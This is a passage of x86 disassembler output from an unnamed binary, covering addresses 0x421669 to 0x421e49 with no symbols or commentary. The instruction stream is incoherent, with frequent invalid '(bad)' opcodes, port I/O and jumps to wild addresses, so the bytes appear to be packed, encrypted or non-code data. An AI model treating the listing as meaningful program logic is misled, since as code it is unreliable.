  421669:	add    eax,0x17475b88
  42166e:	pop    edi
  42166f:	stos   DWORD PTR es:[edi],eax
  421670:	jne    0x4216a7
  421672:	sbb    ah,BYTE PTR [edx+edi*2-0x54]
  421676:	push   0x4e
  421678:	icebp  
  421679:	xchg   edi,eax
  42167a:	out    dx,al
  42167b:	xor    eax,0xb304c8b1
  421680:	cmp    dh,al
  421682:	push   edi
  421683:	aas    
  421684:	xchg   ebx,eax
  421685:	or     BYTE PTR [ebx-0x5e],al
  421688:	pop    ebp
  421689:	rol    BYTE PTR [edx+0x3c833572],0x98
  421690:	inc    ebp
  421691:	arpl   WORD PTR [ecx+0x77d3d45e],cx
  421697:	or     BYTE PTR ds:0xe28d,bl
  42169c:	or     esp,DWORD PTR [esi+0x44]
  42169f:	in     al,dx
  4216a0:	inc    edx
  4216a1:	xchg   edx,esi
  4216a3:	mov    al,0x71
  4216a5:	fdiv   QWORD PTR [ebx-0x2e]
  4216a8:	cmp    BYTE PTR [esi+0x8],cl
  4216ab:	adc    al,BYTE PTR [edx+0x3f4c608f]
  4216b1:	ss inc eax
  4216b3:	shr    BYTE PTR [edx*4+0xea5a41e],1
  4216ba:	loope  0x421728
  4216bc:	jb     0x421711
  4216be:	xchg   edx,eax
  4216bf:	dec    eax
  4216c0:	not    DWORD PTR [ebp+esi*1-0x596f348b]
  4216c7:	inc    ebx
  4216c8:	push   ecx
  4216c9:	and    eax,0xc22a930a
  4216ce:	jge    0x4216a0
  4216d0:	fidivr DWORD PTR [ecx]
  4216d2:	jle    0x42165e
  4216d4:	fbstp  TBYTE PTR cs:[edx-0x3c]
  4216d8:	push   ss
  4216d9:	stos   BYTE PTR es:[edi],al
  4216da:	sbb    dl,BYTE PTR [eax+0x73]
  4216dd:	pop    ebp
  4216de:	add    dl,BYTE PTR [edi+ebp*2-0x18]
  4216e2:	aas    
  4216e3:	pop    es
  4216e4:	popa   
  4216e5:	mov    ds:0x15ff7313,eax
  4216ea:	test   eax,0x9a817825
  4216ef:	aas    
  4216f0:	cld    
  4216f1:	xchg   esp,eax
  4216f2:	jb     0x421755
  4216f4:	(bad)  
  4216f5:	and    cl,ch
  4216f7:	sub    eax,0x8426adc
  4216fc:	mov    eax,ds:0xd490e8e9
  421701:	dec    edi
  421702:	sbb    ch,0x7b
  421705:	bound  edi,QWORD PTR [eax+0x6c]
  421708:	icebp  
  421709:	mov    bl,cl
  42170b:	aad    0x54
  42170d:	mov    dl,0x54
  42170f:	test   al,0x37
  421711:	and    BYTE PTR [edx],dh
  421713:	push   ecx
  421714:	nop
  421715:	xchg   BYTE PTR [ebx+0x52a2be13],dh
  42171b:	dec    ecx
  42171c:	cwde   
  42171d:	mov    dl,0xfb
  42171f:	pop    esp
  421720:	outs   dx,BYTE PTR ds:[esi]
  421721:	loop   0x42179e
  421723:	fadd   st,st(0)
  421725:	push   ecx
  421726:	or     ebx,DWORD PTR [ebp-0x2b631946]
  42172c:	jnp    0x4216d9
  42172e:	clc    
  42172f:	xchg   edx,eax
  421730:	or     eax,0x8287ea28
  421735:	lds    edx,FWORD PTR [ecx-0x538e97]
  42173b:	sub    edi,DWORD PTR [esi-0x7f]
  42173e:	inc    edx
  42173f:	or     al,0xe0
  421741:	cdq    
  421742:	retf   0xe792
  421745:	mov    eax,0x119c8042
  42174a:	pop    ss
  42174b:	stc    
  42174c:	cli    
  42174d:	outs   dx,BYTE PTR ds:[esi]
  42174e:	mov    ch,BYTE PTR ds:0xbc26a3e5
  421754:	lahf   
  421755:	nop
  421756:	test   DWORD PTR [ebp-0x1485122c],ebp
  42175c:	add    DWORD PTR [esi+0x363765c6],eax
  421762:	add    DWORD PTR [edi+0x6cac8899],0xffffffad
  421769:	retf   0xe58a
  42176c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42176d:	jno    0x421710
  42176f:	add    dl,dl
  421771:	and    DWORD PTR [edx-0x2c],eax
  421774:	xchg   BYTE PTR [edx],cl
  421776:	fs inc ebx
  421778:	push   ebx
  421779:	jo     0x42178e
  42177b:	scas   al,BYTE PTR es:[edi]
  42177c:	mov    eax,ds:0xdeec5fbc
  421781:	jle    0x4217a3
  421783:	jbe    0x42177e
  421785:	sbb    ah,BYTE PTR [edx]
  421787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421788:	add    ah,BYTE PTR [ebx+0x3f238b3d]
  42178e:	arpl   WORD PTR [esi+0x4769d69d],bx
  421794:	pop    ebx
  421795:	inc    esi
  421796:	dec    esp
  421797:	sbb    eax,0xca479724
  42179c:	(bad)  
  42179d:	cmp    bl,BYTE PTR [edi]
  42179f:	popf   
  4217a0:	sti    
  4217a1:	add    DWORD PTR [edi+0x1a],eax
  4217a4:	sbb    ch,BYTE PTR [eax-0x9493884]
  4217aa:	dec    esp
  4217ab:	lock out dx,eax
  4217ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217ae:	in     eax,0xd2
  4217b0:	pop    ds
  4217b1:	xor    esi,eax
  4217b3:	cld    
  4217b4:	mov    cs,WORD PTR [edx+0x6b24654c]
  4217ba:	out    0x90,al
  4217bc:	xchg   ebp,eax
  4217bd:	xchg   edx,eax
  4217be:	mov    ch,0x22
  4217c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217c1:	lods   eax,DWORD PTR ds:[esi]
  4217c2:	sbb    DWORD PTR [edi],0xffffffd3
  4217c5:	jl     0x4217c4
  4217c7:	push   ebp
  4217c8:	mov    eax,0x413482d2
  4217cd:	pop    eax
  4217ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217cf:	sbb    bh,dh
  4217d1:	mov    edx,0x54c12151
  4217d6:	mov    ah,0x3e
  4217d8:	(bad)  
  4217d9:	and    eax,0xf192d22a
  4217de:	and    eax,0x72b891c1
  4217e3:	ins    DWORD PTR es:[edi],dx
  4217e4:	or     BYTE PTR [ecx-0x73],dh
  4217e7:	cmp    bl,BYTE PTR [ebp-0xb60abb]
  4217ed:	aaa    
  4217ee:	push   es
  4217ef:	es pop es
  4217f1:	xlat   BYTE PTR ds:[ebx]
  4217f2:	out    dx,eax
  4217f3:	push   ebp
  4217f4:	sub    dh,al
  4217f6:	push   ecx
  4217f7:	xor    esp,ebp
  4217f9:	push   ebx
  4217fa:	lahf   
  4217fb:	dec    ebp
  4217fc:	xchg   BYTE PTR [ebp-0x4098ef11],dh
  421802:	mul    BYTE PTR [ebp-0x586320a5]
  421808:	push   0xfffffffc
  42180a:	pop    es
  42180b:	sbb    eax,0x3941adc
  421810:	mov    esi,0xf2e8f55a
  421815:	cmp    BYTE PTR ds:[esi-0x6e9e8ed4],dh
  42181c:	inc    eax
  42181d:	or     BYTE PTR ds:0x5e5110c1,0x7a
  421824:	imul   esp,DWORD PTR [eax],0x7a
  421827:	jl     0x4217df
  421829:	fdiv   QWORD PTR [edi-0x1954ca9c]
  42182f:	add    BYTE PTR [eax-0x62ec5679],0x44
  421836:	repz arpl ax,cx
  421839:	xchg   ebx,eax
  42183a:	ret    0x8a99
  42183d:	icebp  
  42183e:	cld    
  42183f:	jbe    0x42181f
  421841:	retf   
  421842:	jno    0x421859
  421844:	ficom  DWORD PTR [edx-0x3afd1dcb]
  42184a:	out    0x1,eax
  42184c:	mov    ?,ebp
  42184e:	shr    dl,0x33
  421851:	pop    ss
  421852:	adc    BYTE PTR [edi],0x51
  421855:	int3   
  421856:	mov    eax,edi
  421858:	loopne 0x42188a
  42185a:	mov    edx,0xa9b4f51e
  42185f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421860:	rcl    DWORD PTR [eax-0x55],0x49
	...
  421870:	add    BYTE PTR [esi],bh
  421872:	inc    esi
  421873:	dec    edx
  421874:	mov    ebp,0xc7ffbd7a
  421879:	popa   
  42187a:	dec    edi
  42187b:	push   ds
  42187c:	sbb    DWORD PTR ds:0xc575a398,esi
  421882:	xchg   ecx,eax
  421883:	add    DWORD PTR [eax],eax
  421885:	stos   DWORD PTR es:[edi],eax
  421886:	add    eax,DWORD PTR [eax]
  421888:	add    BYTE PTR [esi+0x31],bl
  42188b:	sti    
  42188c:	pop    ebx
  42188d:	fsub   DWORD PTR ds:0xfd666c0c
  421893:	lods   eax,DWORD PTR ds:[esi]
  421894:	in     eax,dx
  421895:	pusha  
  421896:	push   es
  421897:	push   edi
  421898:	fisttp DWORD PTR [edi]
  42189a:	aaa    
  42189b:	mov    ecx,0x98bd9b8b
  4218a0:	in     al,dx
  4218a1:	das    
  4218a2:	pop    es
  4218a3:	(bad)  [esi+0x5c73746d]
  4218a9:	out    dx,al
  4218aa:	rcr    DWORD PTR [edi-0x5f90e223],cl
  4218b0:	(bad)  
  4218b2:	or     esi,DWORD PTR [edi]
  4218b4:	cld    
  4218b5:	mov    ch,BYTE PTR [ebx]
  4218b7:	pop    esi
  4218b8:	aam    0xf6
  4218ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218bb:	rol    DWORD PTR [ecx],1
  4218bd:	push   cs
  4218be:	sbb    ch,al
  4218c0:	inc    esi
  4218c1:	jno    0x421908
  4218c3:	jo     0x4218bd
  4218c5:	mov    ecx,edx
  4218c7:	jmp    0x421852
  4218c9:	int    0xa5
  4218cb:	lahf   
  4218cc:	js     0x42186c
  4218ce:	test   al,0x9d
  4218d0:	fs inc esi
  4218d2:	add    al,0xd5
  4218d4:	jno    0x4218da
  4218d6:	xchg   ebp,eax
  4218d7:	leave  
  4218d8:	push   eax
  4218d9:	outs   dx,DWORD PTR fs:[esi]
  4218db:	pusha  
  4218dc:	push   eax
  4218dd:	inc    edi
  4218de:	(bad)
  4218e1:	inc    ebx
  4218e2:	into   
  4218e3:	shl    dl,cl
  4218e5:	jmp    0x42ff051b
  4218ea:	lea    edi,[ebx-0x4a]
  4218ed:	or     al,0x73
  4218ef:	retf   0x71d
  4218f2:	fld    st(7)
  4218f4:	cmp    dl,0x72
  4218f7:	mov    eax,ds:0x5c699498
  4218fc:	(bad)  
  4218fd:	sbb    ebp,esp
  4218ff:	(bad)  
  421900:	cld    
  421901:	jmp    0x421891
  421903:	inc    ebx
  421904:	inc    esi
  421905:	or     esi,DWORD PTR [eax+0x396c442f]
  42190b:	mov    dl,0x4c
  42190d:	mov    dh,0xee
  42190f:	mov    dl,0xb8
  421911:	add    eax,0x31742aa2
  421916:	jnp    0x421932
  421918:	in     eax,dx
  421919:	mov    edx,0xbeaebfcc
  42191e:	pusha  
  42191f:	mov    esp,0x2bfd4d44
  421924:	adc    ch,dl
  421926:	call   0x1bc9:0x13f3cc7e
  42192d:	(bad)  [esi+0x5f]
  421930:	retf   
  421931:	retf   
  421932:	pop    edi
  421933:	dec    edi
  421934:	popf   
  421935:	inc    edi
  421936:	pop    ebp
  421937:	fisttp DWORD PTR [edx]
  421939:	push   esi
  42193a:	inc    ebp
  42193b:	cli    
  42193c:	mov    ch,0xeb
  42193e:	mov    ecx,0x64f6b3e
  421943:	nop
  421944:	adc    edi,edx
  421946:	loope  0x421937
  421948:	div    BYTE PTR [esi-0x4a]
  42194b:	mov    ebp,0x37a9fe5f
  421950:	jle    0x4218e5
  421952:	mov    esi,0xe9db8fe2
  421957:	xchg   BYTE PTR ds:0x9281b910,ah
  42195d:	dec    esp
  42195e:	push   ss
  42195f:	sbb    cl,ah
  421961:	cwde   
  421962:	jmp    0x86ba7ec5
  421967:	jne    0x4219d2
  421969:	(bad)  
  42196b:	ins    BYTE PTR es:[edi],dx
  42196c:	adc    DWORD PTR [esi+0x1b01461],ecx
  421972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421973:	(bad)  
  421974:	adc    al,0x49
  421976:	push   0xa7cb8b7c
  42197b:	stos   BYTE PTR es:[edi],al
  42197c:	mov    bl,0x4
  42197e:	mov    bl,0x7b
  421980:	pop    ebp
  421981:	mov    ecx,0xec1fd6a8
  421986:	faddp  st(7),st
  421988:	ret    0x256a
  42198b:	iret   
  42198c:	sbb    al,0xde
  42198e:	mov    bl,0xd3
  421990:	mov    eax,0xcb1148a5
  421995:	sbb    al,0x48
  421997:	lea    ecx,[edi-0xf]
  42199a:	vpminsw xmm4,xmm5,XMMWORD PTR gs:[ecx-0x4cee7678]
  4219a3:	mov    esi,0x6d1880e3
  4219a8:	dec    ebp
  4219a9:	neg    DWORD PTR [esi+0x70]
  4219ac:	xlat   BYTE PTR ds:[ebx]
  4219ad:	or     esi,ecx
  4219af:	mov    eax,0x59ab2259
  4219b4:	jb     0x421a13
  4219b6:	sbb    DWORD PTR [esi+0x6cb7ead2],ebp
  4219bc:	jmp    0x495efe81
  4219c1:	mov    eax,0xaa6dcd3
  4219c6:	mov    esp,0xe19ce37b
  4219cb:	jo     0x421a0f
  4219cd:	outs   dx,BYTE PTR ds:[esi]
  4219ce:	cmp    ah,bh
  4219d0:	push   ecx
  4219d1:	pop    ds
  4219d2:	loop   0x421963
  4219d4:	sub    bl,BYTE PTR [ecx+0x2282d803]
  4219da:	shl    cl,cl
  4219dc:	jmp    0x42198d
  4219de:	dec    ecx
  4219df:	repnz dec ecx
  4219e1:	test   al,0xe9
  4219e3:	ds dec edi
  4219e5:	pop    ebx
  4219e6:	cli    
  4219e7:	call   0x4278784c
  4219ec:	stos   BYTE PTR es:[edi],al
  4219ed:	xchg   esp,eax
  4219ee:	xchg   esp,eax
  4219ef:	call   0x5675f2fe
  4219f4:	mov    BYTE PTR ds:0xc8c21734,ch
  4219fa:	sub    DWORD PTR [ebp+0x2eb8727],0xffffffa7
  421a01:	xchg   BYTE PTR [edi+ebp*8-0x2ea9761a],dh
  421a08:	mov    ds:0xf88a74ed,al
  421a0d:	jmp    DWORD PTR [bx+di]
  421a10:	mov    WORD PTR [edx-0x56],?
  421a13:	rcr    ebp,cl
  421a15:	add    ebx,DWORD PTR [ebp+0x79]
  421a18:	mov    cl,al
  421a1a:	(bad)  
  421a1b:	cmp    dl,bl
  421a1d:	aas    
  421a1e:	mov    ebp,0x1a87b78c
  421a23:	adc    ebx,DWORD PTR [ebx-0x664dfc90]
  421a29:	push   si
  421a2b:	pusha  
  421a2c:	jle    0x421aa1
  421a2e:	popf   
  421a2f:	jecxz  0x4219c9
  421a31:	adc    eax,0xa13f616c
  421a36:	pushf  
  421a37:	scas   al,BYTE PTR es:[edi]
  421a38:	pop    ecx
  421a39:	or     al,0xe6
  421a3b:	aas    
  421a3c:	jne    0x421a7a
  421a3e:	adc    DWORD PTR [ebp+0x5a],edx
  421a41:	ins    DWORD PTR es:[edi],dx
  421a42:	std    
  421a43:	fisttp DWORD PTR [eax-0x64114e80]
  421a49:	add    DWORD PTR [edi-0x7d5bff39],esi
  421a4f:	outs   dx,BYTE PTR ds:[esi]
  421a50:	ficomp WORD PTR [edi]
  421a52:	add    esp,ebp
  421a54:	std    
  421a55:	inc    eax
  421a56:	mov    ebp,0x696993ea
  421a5b:	mov    ds:0xb3d8f43,eax
  421a60:	pop    eax
  421a61:	lahf   
  421a62:	fisub  WORD PTR [edi-0x3]
  421a65:	jmp    0x421a14
  421a67:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a69:	fcom   DWORD PTR [ecx*4-0x7e4a491]
  421a70:	pop    ds
  421a71:	ss mov ebp,0xb94a6141
  421a77:	ja     0x421a7d
  421a79:	icebp  
  421a7a:	or     esp,DWORD PTR [ebp-0x44]
  421a7d:	sbb    BYTE PTR [edx],ah
  421a7f:	sbb    al,dh
  421a81:	aaa    
  421a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a83:	sub    DWORD PTR [edi],edi
  421a85:	fwait
  421a86:	mov    ch,0x62
  421a88:	cli    
  421a89:	mov    al,ds:0x9bbcd089
  421a8e:	mov    eax,0x6073aabc
  421a93:	cmp    edi,ebx
  421a95:	mov    al,0xe8
  421a97:	sub    BYTE PTR [esi],dl
  421a99:	jo     0x421a43
  421a9b:	bound  eax,QWORD PTR [ebx-0x24]
  421a9e:	jmp    0x4d02:0x728ab823
  421aa5:	retf   0x6890
  421aa8:	shr    BYTE PTR [ebx+0x57],cl
  421aab:	ret    0xb122
  421aae:	retf   
  421aaf:	jo     0x421ad9
  421ab1:	jbe    0x421a3f
  421ab3:	dec    ebp
  421ab4:	enter  0xf5f9,0x8a
  421ab8:	cmp    BYTE PTR [ebp+0x225f5ae1],cl
  421abe:	sub    al,BYTE PTR [edx]
  421ac0:	jle    0x421afb
  421ac2:	das    
  421ac3:	leave  
  421ac4:	rol    BYTE PTR [edi],1
  421ac6:	xor    edi,DWORD PTR [esi+edx*4]
  421ac9:	dec    esi
  421aca:	dec    ebx
  421acb:	xchg   edx,eax
  421acc:	std    
  421acd:	out    dx,eax
  421ace:	xchg   esi,eax
  421acf:	jge    0x421b05
  421ad1:	jmp    0x7461:0xbc220428
  421ad8:	rcr    BYTE PTR [edx+0x2c9e35c2],cl
  421ade:	jae    0x421b14
  421ae0:	lods   eax,DWORD PTR ds:[esi]
  421ae1:	jg     0x421ab2
  421ae3:	or     DWORD PTR [edx+eax*1],eax
  421ae6:	popa   
  421ae7:	pop    esp
  421ae8:	(bad)  
  421ae9:	ss jnp 0x421a89
  421aec:	xchg   esp,eax
  421aed:	jmp    0x421b25
  421aef:	xor    DWORD PTR [eax-0x75],ebp
  421af2:	shl    DWORD PTR [ecx],cl
  421af4:	out    0xe0,eax
  421af6:	popa   
  421af7:	scas   eax,DWORD PTR es:[edi]
  421af8:	mov    edi,0x39412fd7
  421afd:	pop    esp
  421afe:	aaa    
  421aff:	or     al,BYTE PTR [eax]
  421b01:	mov    dh,dl
  421b03:	xor    DWORD PTR [ebp-0x22],eax
  421b06:	mov    ds:0xf1026cfe,eax
  421b0b:	push   eax
  421b0c:	xor    eax,0x3ceb38ba
  421b11:	lods   eax,DWORD PTR ds:[esi]
  421b12:	adc    BYTE PTR [eax+0x704f8668],ch
  421b18:	mov    dl,0x60
  421b1a:	dec    edx
  421b1b:	stos   BYTE PTR es:[edi],al
  421b1c:	sub    al,0x21
  421b1e:	xor    BYTE PTR [ecx+eax*1],0xee
  421b22:	lahf   
  421b23:	fidivr WORD PTR [edx+0x33]
  421b26:	icebp  
  421b27:	mov    ecx,0xb3ac358a
  421b2c:	sbb    DWORD PTR [ecx],eax
  421b2e:	fcmovb st,st(2)
  421b30:	mov    BYTE PTR [esi-0x4ecd2f55],ch
  421b36:	xchg   ebp,eax
  421b37:	pop    edx
  421b38:	imul   esi,DWORD PTR [eax-0x3072661c],0x7f
  421b3f:	data16 add dh,BYTE PTR [ecx-0x680963e1]
  421b46:	repnz push ebp
  421b48:	mov    edx,0xc013651a
  421b4d:	out    dx,al
  421b4e:	aam    0x2
  421b50:	mov    eax,ds:0xe6123127
  421b55:	mov    edx,0xe6ab9e1
  421b5a:	xlat   BYTE PTR ds:[ebx]
  421b5b:	cmp    al,0x5c
  421b5e:	cwde   
  421b5f:	cmp    al,0x5
  421b61:	and    esi,DWORD PTR [ebx]
  421b63:	lahf   
  421b64:	pop    esi
  421b65:	ins    DWORD PTR es:[edi],dx
  421b66:	mov    bl,0x69
  421b68:	cdq    
  421b69:	adc    eax,0xc5cb88c8
  421b6e:	or     ch,dh
  421b70:	or     BYTE PTR [esi],cl
  421b72:	into   
  421b73:	jmp    edi
  421b75:	adc    eax,0x2e3e7422
  421b7a:	fnsave [esi-0x64]
  421b7d:	add    BYTE PTR [eax-0x6c],bh
  421b80:	shr    DWORD PTR [eax],1
  421b82:	out    0xb1,al
  421b84:	push   eax
  421b85:	hlt    
  421b86:	retf   
  421b87:	stos   BYTE PTR es:[edi],al
  421b88:	or     al,0x1c
  421b8a:	mov    gs,WORD PTR [edx+0x39]
  421b8d:	xor    ebx,edx
  421b8f:	pop    ebx
  421b90:	jbe    0x421c05
  421b92:	mov    DWORD PTR [edx],ecx
  421b94:	mov    edx,0x85d5851c
  421b99:	or     al,0x17
  421b9b:	retf   0x605b
  421b9e:	sub    eax,0xa9f908bd
  421ba3:	mov    dl,0x47
  421ba5:	add    ch,cl
  421ba7:	cli    
  421ba8:	adc    DWORD PTR [ebx+0x545cf7d2],0x8c2fa7a7
  421bb2:	cli    
  421bb3:	dec    ebp
  421bb4:	push   edx
  421bb5:	jmp    0x421bcc
  421bb7:	pop    edx
  421bb8:	adc    ecx,DWORD PTR ds:0xb0821a56
  421bbe:	ss clc 
  421bc0:	jb     0x421c1b
  421bc2:	sar    edi,1
  421bc4:	sub    edx,ebp
  421bc6:	adc    eax,0x2b014c7
  421bcb:	repz fild WORD PTR ds:0x5b0ce512
  421bd2:	sbb    BYTE PTR [ecx+0x401f6de7],bh
  421bd8:	mov    edi,0x43737804
  421bdd:	mov    ecx,0xa743be4
  421be2:	mov    BYTE PTR ds:0x2b027256,cl
  421be8:	vpsadbw ymm0,ymm3,ymm1
  421bec:	add    edi,DWORD PTR [ebx+0x1786d647]
  421bf2:	xlat   BYTE PTR ds:[ebx]
  421bf3:	xchg   edi,eax
  421bf4:	bnd jno 0x421b8e
  421bf7:	cmp    esp,esi
  421bf9:	mov    al,0x99
  421bfb:	out    0x47,eax
  421bfd:	inc    ebp
  421bfe:	pop    ebx
  421bff:	scas   eax,DWORD PTR es:[edi]
  421c00:	pop    ecx
  421c01:	inc    edx
  421c02:	push   cs
  421c03:	sbb    eax,0x58d69610
  421c08:	shr    DWORD PTR [ecx+0x1],cl
  421c0b:	cdq    
  421c0c:	inc    ecx
  421c0d:	mov    dl,0x79
  421c0f:	mov    dh,0x7e
  421c11:	pop    ds
  421c12:	dec    ebp
  421c13:	cmp    esi,esp
  421c15:	scas   al,BYTE PTR es:[edi]
  421c16:	xor    edi,DWORD PTR [esi]
  421c18:	inc    ecx
  421c19:	push   0x2ea4a974
  421c1e:	sbb    dl,cl
  421c20:	ficomp WORD PTR [edx-0x58d2008d]
  421c26:	fwait
  421c27:	inc    edi
  421c28:	rcr    BYTE PTR [ecx],cl
  421c2a:	push   eax
  421c2b:	in     al,dx
  421c2c:	pop    ecx
  421c2d:	in     eax,dx
  421c2e:	das    
  421c2f:	push   eax
  421c30:	js     0x421bdf
  421c32:	xchg   esi,eax
  421c33:	in     eax,dx
	...
  421c40:	add    BYTE PTR [edx+eax*8],cl
  421c43:	xlat   BYTE PTR ds:[ebx]
  421c44:	and    bl,bh
  421c46:	aaa    
  421c47:	std    
  421c48:	out    dx,al
  421c49:	and    eax,0xbe971a56
  421c4e:	xor    BYTE PTR [ebp+0x195709f],0x0
  421c55:	stos   DWORD PTR es:[edi],eax
  421c56:	add    eax,DWORD PTR [eax]
  421c58:	add    BYTE PTR [edi+0xba4d498],dh
  421c5e:	and    DWORD PTR [ecx],edx
  421c60:	cs dec edi
  421c62:	push   ecx
  421c63:	lods   eax,DWORD PTR ds:[esi]
  421c64:	ret    0x4766
  421c67:	icebp  
  421c68:	cmp    BYTE PTR [ebp+0x33c1fd71],0x2d
  421c6f:	inc    esp
  421c70:	xchg   ecx,eax
  421c72:	loop   0x421c71
  421c74:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  421c76:	or     al,0x79
  421c78:	xor    eax,0xd245f8df
  421c7d:	(bad)  
  421c7f:	fcomip st,st(7)
  421c81:	cld    
  421c82:	cdq    
  421c83:	mov    edx,0xe021aa53
  421c88:	add    al,0xce
  421c8a:	and    ah,BYTE PTR [ebp+0x6e922d6e]
  421c90:	or     DWORD PTR [esi-0x33],ebx
  421c93:	or     eax,0xc13b859
  421c98:	retf   
  421c99:	in     al,dx
  421c9a:	inc    esi
  421c9b:	test   DWORD PTR [ebp+0x322d9ba5],edi
  421ca1:	cmc    
  421ca2:	and    al,0x6
  421ca4:	addr16 jno 0x421c82
  421ca7:	and    eax,0x9a2a54bd
  421cac:	or     cl,0xe8
  421caf:	dec    DWORD PTR [ecx+0x34]
  421cb2:	rcl    DWORD PTR ss:[ebx+ecx*1+0x615d6313],0x3c
  421cbb:	mov    ah,0x5b
  421cbd:	cwde   
  421cbe:	sahf   
  421cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cc0:	(bad)  
  421cc1:	leave  
  421cc2:	cmc    
  421cc3:	jmp    0xb8157cea
  421cc8:	sub    eax,0x9e2f354c
  421ccd:	push   0xa6dfab63
  421cd2:	dec    ebx
  421cd3:	xor    al,0xc
  421cd5:	adc    BYTE PTR [edx-0x32],ch
  421cd8:	icebp  
  421cd9:	adc    DWORD PTR [edi+ebp*4],esi
  421cdc:	xchg   ebx,eax
  421cdd:	ds ins BYTE PTR es:[edi],dx
  421cdf:	(bad)
  421ce2:	mov    esp,0xb99e33ae
  421ce7:	mov    esp,edx
  421ce9:	icebp  
  421cea:	jecxz  0x421c87
  421cec:	xchg   ebp,eax
  421ced:	inc    edi
  421cee:	dec    esi
  421cef:	or     DWORD PTR [ebx-0x7a],0xffffffb6
  421cf3:	call   0x4c34db02
  421cf8:	mov    esp,0xa3c1bd20
  421cfd:	jnp    0x421cbe
  421cff:	cs mov cl,0xb1
  421d02:	push   eax
  421d03:	pop    esi
  421d04:	lods   al,BYTE PTR ds:[esi]
  421d05:	mov    ebp,0xba976260
  421d0a:	mov    bh,0x15
  421d0c:	aaa    
  421d0d:	dec    ebx
  421d0e:	call   0x897d:0xdadca1af
  421d15:	shl    ecx,1
  421d17:	int    0xac
  421d19:	and    edi,ebp
  421d1b:	mov    gs,WORD PTR [esi-0x77027f7e]
  421d21:	mov    ah,ch
  421d23:	mov    eax,ds:0x939e6d1a
  421d28:	enter  0x69aa,0x17
  421d2c:	outs   dx,BYTE PTR ds:[esi]
  421d2d:	iret   
  421d2e:	into   
  421d2f:	pop    eax
  421d30:	jno    0x421d11
  421d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d33:	cmp    DWORD PTR [ebx],eax
  421d35:	push   es
  421d36:	sub    BYTE PTR [ecx+ebp*1],ch
  421d39:	mov    edx,0x4e0ba9fb
  421d3e:	lock into 
  421d40:	pop    esi
  421d41:	and    dh,BYTE PTR [eax-0x15]
  421d44:	je     0x421dc1
  421d46:	in     al,dx
  421d47:	mov    eax,ds:0x34d0192d
  421d4c:	es add al,0x26
  421d4f:	in     al,0x14
  421d51:	mov    BYTE PTR [edi+0xb],dl
  421d54:	mov    cl,0xd
  421d56:	sbb    BYTE PTR ds:0x29872f3c,dh
  421d5c:	mov    DWORD PTR [edx+eiz*4-0x592352e3],edx
  421d63:	pop    ds
  421d64:	call   0x9dba2906
  421d69:	mov    DWORD PTR [ebx+0x5a],ebp
  421d6c:	int3   
  421d6d:	ja     0x421d9d
  421d6f:	scas   eax,DWORD PTR es:[edi]
  421d70:	cmp    BYTE PTR [edi],0x70
  421d73:	pushf  
  421d74:	mov    ah,BYTE PTR [edi+0x51c1946d]
  421d7a:	mov    esi,0xb95cc49b
  421d7f:	push   es
  421d80:	psrlw  mm6,0xbd
  421d84:	in     al,0x37
  421d86:	out    0xed,eax
  421d88:	rol    DWORD PTR [eax+0x2eaab4b9],1
  421d8e:	mov    edi,0x77b15dd7
  421d93:	frstor [eax-0x714bfc04]
  421d99:	jnp    0x421d48
  421d9b:	jge    0x421d53
  421d9d:	ret    
  421d9e:	lock daa 
  421da0:	and    ecx,DWORD PTR [edx]
  421da2:	adc    edx,ebx
  421da4:	jle    0x421d3e
  421da6:	ins    BYTE PTR es:[edi],dx
  421da7:	dec    edx
  421da8:	add    eax,0x1cece7f7
  421dad:	popa   
  421dae:	jae    0x421d50
  421db0:	(bad)  
  421db1:	xor    al,0x64
  421db3:	mov    ebx,DWORD PTR [ebp-0x31]
  421db6:	and    DWORD PTR [eax+0x42],edi
  421db9:	cwde   
  421dba:	adc    cl,dl
  421dbc:	lahf   
  421dbd:	or     al,BYTE PTR [edi-0x80]
  421dc0:	jnp    0x421e1c
  421dc2:	out    0xbe,eax
  421dc4:	push   edx
  421dc5:	jnp    0x421d53
  421dc7:	adc    esp,DWORD PTR [edx]
  421dc9:	inc    ecx
  421dca:	mov    esp,0xc9603a06
  421dcf:	mov    ch,0x91
  421dd1:	ss push ebx
  421dd3:	ror    DWORD PTR [ebx-0x76],1
  421dd6:	jo     0x421e18
  421dd8:	mov    ebp,gs
  421dda:	mov    esi,0xe21eb9bd
  421ddf:	sub    al,0xd0
  421de1:	lods   eax,DWORD PTR ds:[esi]
  421de2:	sbb    BYTE PTR [ebx],cl
  421de4:	jne    0x421d66
  421de6:	ret    
  421de7:	repz aam 0xd7
  421dea:	inc    DWORD PTR [edi+0x2a]
  421ded:	ficomp WORD PTR [edx+0x287f20b4]
  421df3:	ja     0x421e35
  421df5:	bound  ebp,QWORD PTR [ebp+0xd181a3e]
  421dfb:	add    eax,edx
  421dfd:	in     al,0x8
  421dff:	rol    BYTE PTR [esi],1
  421e01:	jl     0x421dd1
  421e03:	repz add BYTE PTR [ebp+0x1bbd492],al
  421e0a:	call   0x644f372b
  421e0f:	clc    
  421e10:	add    DWORD PTR [eax],edi
  421e12:	leave  
  421e13:	push   ds
  421e14:	pop    ebx
  421e15:	lods   eax,DWORD PTR ds:[esi]
  421e16:	fsub   DWORD PTR [ebp-0x3fdd0b9b]
  421e1c:	leave  
  421e1d:	enter  0xdb9b,0x8
  421e21:	mov    ch,0x6
  421e23:	xchg   edi,eax
  421e24:	bound  ebp,QWORD PTR [ecx]
  421e26:	xor    DWORD PTR [edi-0x13af12fc],ecx
  421e2c:	xor    eax,0xbd56f420
  421e31:	cmp    eax,0x3b996e8c
  421e36:	mov    ch,BYTE PTR [ebx+0x1ba729fc]
  421e3c:	dec    edi
  421e3d:	inc    ebp
  421e3e:	inc    edi
  421e3f:	nop
  421e40:	mov    bh,0xc7
  421e42:	push   0xfffffff7
  421e44:	mov    ds:0x462f219e,al
  421e49:	fcmovb st,st(5)
